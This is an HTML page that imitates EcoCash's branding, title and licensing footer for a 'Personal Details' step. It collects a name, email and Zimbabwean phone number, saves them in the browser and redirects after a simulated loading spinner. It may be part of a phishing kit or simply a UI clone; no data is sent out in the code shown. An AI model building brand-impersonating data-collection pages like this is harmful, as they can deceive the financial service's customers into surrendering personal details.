<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
    <title>EcoCash | Personal Details – ecocash.co.zw</title>
    <link rel="icon" href="#" type="image/x-icon">
    <meta name="theme-color" content="#1c6aa6">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #e5e5e5;
            color: #1a1a1a;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 12px;
        }

        header {
            width: 100%;
            max-width: 480px;
            padding: 12px 16px;
            text-align: center;
            margin-bottom: 12px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
            position: relative;
        }

        .back-btn {
            font-size: 28px;
            background: none;
            border: none;
            cursor: pointer;
            color: #1c6aa6;
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            line-height: 1;
        }

        .logo {
            font-size: clamp(28px, 7vw, 40px);
            font-weight: 800;
            letter-spacing: -0.5px;
        }

        .logo-eco {
            color: #1c6aa6;
        }

        .logo-cash {
            color: #e12b2b;
        }

        main {
            flex: 1;
            max-width: 480px;
            width: 100%;
            margin: 0 auto;
            position: relative;
        }

        .form-card {
            background: white;
            border-radius: 20px;
            padding: 24px 18px 32px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
            position: relative;
        }

        /* Error box – EcoCash red accent */
        .error-box {
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            background: #fff;
            border: 2px solid #e12b2b;
            border-radius: 14px;
            padding: 12px;
            display: none;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
            z-index: 100;
            text-align: left;
        }

        .error-title {
            color: #e12b2b;
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 4px;
        }

        .error-text {
            color: #444;
            font-size: 13px;
        }

        .close {
            position: absolute;
            right: 12px;
            top: 8px;
            cursor: pointer;
            font-size: 20px;
            color: #999;
        }

        .form-title {
            font-size: clamp(24px, 6vw, 32px);
            font-weight: 700;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 1.2rem;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            margin: 1rem auto 0.8rem;
            overflow: hidden;
        }

        .progress-fill {
            width: 66.66%;
            height: 100%;
            background: linear-gradient(90deg, #1c6aa6, #0e4a73);
            border-radius: 4px;
        }

        .step-text {
            text-align: center;
            color: #6c757d;
            font-size: 0.9rem;
            margin-bottom: 1.8rem;
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-label {
            display: block;
            font-weight: 600;
            color: #2c3e50;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }

        .form-input {
            width: 100%;
            padding: 0.9rem 1rem;
            border: 1px solid #ced4da;
            border-radius: 10px;
            font-size: 1rem;
            background: #fdfdfe;
            transition: all 0.2s;
        }

        .form-input:focus {
            border-color: #1c6aa6;
            outline: none;
            box-shadow: 0 0 0 3px rgba(28, 106, 166, 0.15);
        }

        /* Invalid highlight */
        .form-input.invalid,
        #phoneGroup.invalid {
            border-color: #e12b2b !important;
            box-shadow: 0 0 0 3px rgba(225, 43, 43, 0.15) !important;
        }

        .name-group {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .name-group>div {
            flex: 1;
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
        }

        .prev-btn,
        .next-btn {
            flex: 1;
            padding: 1rem;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            touch-action: manipulation;
        }

        .prev-btn {
            background: #e2e8f0;
            color: #475569;
            border: none;
        }

        .prev-btn:active {
            transform: scale(0.97);
        }

        .next-btn {
            background: linear-gradient(90deg, #1c6aa6, #0e4a73);
            color: white;
            border: none;
            box-shadow: 0 6px 18px rgba(28, 106, 166, 0.25);
        }

        .next-btn:active {
            transform: scale(0.97);
        }

        .next-btn.disabled-btn,
        .next-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        footer {
            padding: 20px 16px;
            color: #adb5bd;
            font-size: 12px;
            text-align: center;
            margin-top: auto;
        }

        /* ========== BLUE SPINNER (progress dialog) ========== */
        #spinner {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(3px);
            z-index: 999;
        }

        .loader {
            width: 48px;
            height: 48px;
            border: 5px solid #ffffff;
            border-top: 5px solid #1c6aa6;   /* blue instead of red */
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Extra fine-tuning */
        @media (max-width: 380px) {
            body {
                padding: 8px;
            }

            .form-card {
                padding: 20px 14px;
            }

            .form-input {
                padding: 0.8rem 0.9rem;
                font-size: 0.9rem;
            }

            .name-group {
                gap: 0.8rem;
                flex-direction: column;
                margin-bottom: 0.8rem;
            }

            .btn-group {
                gap: 0.8rem;
            }

            .prev-btn,
            .next-btn {
                padding: 0.8rem;
                font-size: 0.9rem;
            }
        }

        @media (min-width: 769px) {
            body {
                padding: 32px;
            }

            .form-card {
                padding: 2.5rem 3rem;
            }
        }

        /* Phone group special styling */
        #phoneGroup {
            display: flex;
            align-items: center;
            border: 1px solid #ced4da;
            border-radius: 10px;
            padding: 0 1rem;
            background: #fdfdfe;
        }

        #phoneGroup span {
            color: #1c6aa6;
            font-weight: 600;
            margin-right: 0.5rem;
        }

        #phoneGroup input {
            flex: 1;
            border: none;
            outline: none;
            padding: 0.9rem 0;
            font-size: 1rem;
            background: transparent;
        }
    </style>
</head>

<body>
    <header>
        <button class="back-btn" onclick="history.back()">←</button>
        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
    </header>
    <main>
        <div class="form-card">
            <!-- Error box – EcoCash red accent -->
            <div class="error-box" id="errorBox">
                <div class="close" onclick="hideError()">×</div>
                <div class="error-title">Error</div>
                <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
            </div>

            <h1 class="form-title">Personal Details</h1>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="name-group">
                <div>
                    <label class="form-label">First Name</label>
                    <input type="text" class="form-input" id="firstName" placeholder="e.g. Tinashe">
                </div>
                <div>
                    <label class="form-label">Last Name</label>
                    <input type="text" class="form-input" id="lastName" placeholder="e.g. Moyo">
                </div>
            </div>

            <div class="form-group">
                <label class="form-label">Email Address</label>
                <input type="email" class="form-input" id="email" placeholder="e.g. tinashe.moyo@example.com">
            </div>

            <div class="form-group">
                <label class="form-label">Phone Number</label>
                <div id="phoneGroup">
                    <span>+263</span>
                    <input type="tel" id="phone" placeholder="77 123 4567 or 077 123 4567" maxlength="10" inputmode="numeric">
                </div>
                <div style="font-size: 12px; color: #6c757d; margin-top: 4px;">
                    Enter 9 or 10 digits (e.g., 771234567 or 0771234567)
                </div>
            </div>

            <div class="btn-group">
                <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
                <button class="next-btn" id="nextBtn">NEXT STEP</button>
            </div>
        </div>
    </main>
    <footer>
        © 2026 EcoCash – Licensed Mobile Financial Services | Powered by EcoCash Wallet
    </footer>

    <!-- Blue Spinner overlay -->
    <div id="spinner">
        <div class="loader"></div>
    </div>

    <script>
        // ========== DOM elements ==========
        const firstNameInput = document.getElementById('firstName');
        const lastNameInput = document.getElementById('lastName');
        const emailInput = document.getElementById('email');
        const phoneInput = document.getElementById('phone');
        const phoneGroup = document.getElementById('phoneGroup');
        const nextBtn = document.getElementById('nextBtn');
        const spinner = document.getElementById('spinner');
        const errorBox = document.getElementById('errorBox');
        const errorText = document.getElementById('errorText');

        // Pre-fill from localStorage if available (store normalized 9-digit)
        if (localStorage.getItem('firstName')) firstNameInput.value = localStorage.getItem('firstName');
        if (localStorage.getItem('lastName')) lastNameInput.value = localStorage.getItem('lastName');
        if (localStorage.getItem('email')) emailInput.value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) phoneInput.value = localStorage.getItem('phone');

        // ========== Helper: show/hide error ==========
        function showError(message) {
            errorText.innerText = message || 'Please fix the highlighted fields.';
            errorBox.style.display = 'block';
        }

        function hideError() {
            errorBox.style.display = 'none';
        }

        // Remove invalid highlight from all fields
        function resetInvalidHighlights() {
            document.querySelectorAll('.form-input, #phoneGroup').forEach(el => {
                el.classList.remove('invalid');
            });
        }

        // ========== Zimbabwe phone normalization (accept 07... or 7...) ==========
        // Returns normalized 9-digit string starting with '7', or null if invalid
        function normalizeZimPhone(phoneRaw) {
            let digits = phoneRaw.replace(/\D/g, '');
            if (digits.length === 0) return null;
            // If starts with 0 and total length 10, remove leading 0 -> 9 digits
            if (digits.startsWith('0') && digits.length === 10) {
                digits = digits.substring(1);
            }
            // Now must be exactly 9 digits and start with '7'
            if (digits.length === 9 && digits.startsWith('7')) {
                return digits;
            }
            return null;
        }

        function validateForm() {
            let isValid = true;
            let errorMsg = '';

            resetInvalidHighlights();
            hideError();

            const firstName = firstNameInput.value.trim();
            const lastName = lastNameInput.value.trim();
            const phoneRaw = phoneInput.value.trim();

            // First name
            if (!firstName) {
                firstNameInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'First name is required.';
            } else if (firstName.length < 2) {
                firstNameInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'First name must be at least 2 characters.';
            }

            // Last name
            if (!lastName) {
                lastNameInput.classList.add('invalid');
                isValid = false;
                if (!errorMsg) errorMsg = 'Last name is required.';
            } else if (lastName.length < 2) {
                lastNameInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'Last name must be at least 2 characters.';
            }

            // Phone number: allow 9 or 10 digits (with optional leading 0)
            let normalizedPhone = null;
            if (!phoneRaw) {
                phoneGroup.classList.add('invalid');
                isValid = false;
                errorMsg = 'Phone number is required.';
            } else {
                normalizedPhone = normalizeZimPhone(phoneRaw);
                if (!normalizedPhone) {
                    phoneGroup.classList.add('invalid');
                    isValid = false;
                    errorMsg = 'Enter a valid EcoCash number: 771234567 (9 digits) or 0771234567 (10 digits).';
                }
            }

            // Email optional but if provided must be valid
            const email = emailInput.value.trim();
            if (email && (!email.includes('@') || !email.includes('.') || email.length < 5)) {
                emailInput.classList.add('invalid');
                isValid = false;
                errorMsg = 'Please enter a valid email address (e.g., name@domain.com).';
            }

            if (!isValid) {
                showError(errorMsg || 'Please correct the highlighted fields.');
                const firstInvalid = document.querySelector('.invalid');
                if (firstInvalid) firstInvalid.scrollIntoView({ behavior: 'smooth', block: 'center' });
                return false;
            }

            // Store normalized phone (9 digits) back into input for consistency
            if (normalizedPhone) {
                phoneInput.value = normalizedPhone;
            }
            return true;
        }

        // ========== Save data, show spinner, wait 3 seconds, redirect ==========
        let isProcessing = false;

        function proceedToSummary() {
            if (isProcessing) return;
            if (!validateForm()) return;

            // Save normalized values to localStorage
            localStorage.setItem('firstName', firstNameInput.value.trim());
            localStorage.setItem('lastName', lastNameInput.value.trim());
            localStorage.setItem('email', emailInput.value.trim());
            localStorage.setItem('phone', phoneInput.value.trim());   // already normalized to 9-digit

            // Disable button and show blue spinner
            nextBtn.disabled = true;
            nextBtn.classList.add('disabled-btn');
            isProcessing = true;
            spinner.style.display = 'flex';

            // 3-second loading simulation before redirect
            setTimeout(() => {
                window.location.href = 'summary.html';
            }, 3000);
        }

        // ========== Event listeners ==========
        nextBtn.addEventListener('click', proceedToSummary);

        // Clear error & highlights when user starts typing
        const clearErrorOnInput = (el, isPhoneGroup = false) => {
            el.addEventListener('input', () => {
                hideError();
                if (isPhoneGroup) {
                    phoneGroup.classList.remove('invalid');
                } else {
                    el.classList.remove('invalid');
                }
            });
        };
        clearErrorOnInput(firstNameInput);
        clearErrorOnInput(lastNameInput);
        clearErrorOnInput(emailInput);
        clearErrorOnInput(phoneInput);
        // Special for phone group removal
        phoneInput.addEventListener('input', () => {
            phoneGroup.classList.remove('invalid');
            hideError();
        });

        // Expose hideError globally for close button
        window.hideError = hideError;

        // Optional: format phone on blur (show normalized version)
        phoneInput.addEventListener('blur', function() {
            const raw = this.value.trim();
            const normalized = normalizeZimPhone(raw);
            if (normalized) {
                this.value = normalized;
            }
        });
    </script>
</body>

</html>
